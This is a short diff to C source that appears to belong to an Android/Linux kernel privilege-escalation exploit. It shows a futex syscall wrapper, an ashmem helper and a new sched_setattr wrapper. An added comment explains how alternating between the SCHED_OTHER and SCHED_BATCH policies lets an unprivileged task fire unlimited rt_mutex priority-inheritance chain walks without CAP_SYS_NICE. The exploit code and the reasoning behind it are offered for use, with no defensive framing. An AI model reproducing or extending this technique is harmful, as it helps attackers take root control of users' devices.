@@ -268,13 +268,24 @@ long futex_op(uint32_t *uaddr, int op, uint32_t val,
   return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
 }
 
-long sched_setattr_tid(int tid, int nice_value) {
+/* ALTERNATING the policy is what lets the consumer fire an UNLIMITED number of
+ * real chain walks: __sched_setscheduler() only reaches `change:` (and therefore
+ * rt_mutex_adjust_pi()) when something actually changes, and the nice value can
+ * only be raised 19 times by an unprivileged task (lowering it needs
+ * CAP_SYS_NICE). Switching between two fair policies (SCHED_OTHER <-> BATCH) has
+ * no capability requirement as long as the nice value stays put, and it changes
+ * p->policy => a real walk every single call. */
+long sched_setattr_tid_policy(int tid, int policy, int nice_value) {
   struct local_sched_attr attr;
   memset(&attr, 0, sizeof(attr));
   attr.size = sizeof(attr);
-  attr.sched_policy = SCHED_BATCH;
+  attr.sched_policy = (uint32_t)policy;
   attr.sched_nice = nice_value;
   return syscall(SYS_sched_setattr, tid, &attr, 0);
+}
+
+long sched_setattr_tid(int tid, int nice_value) {
+  return sched_setattr_tid_policy(tid, SCHED_BATCH, nice_value);
 }
 
 int try_cache_ashmem_path(const char *path) {
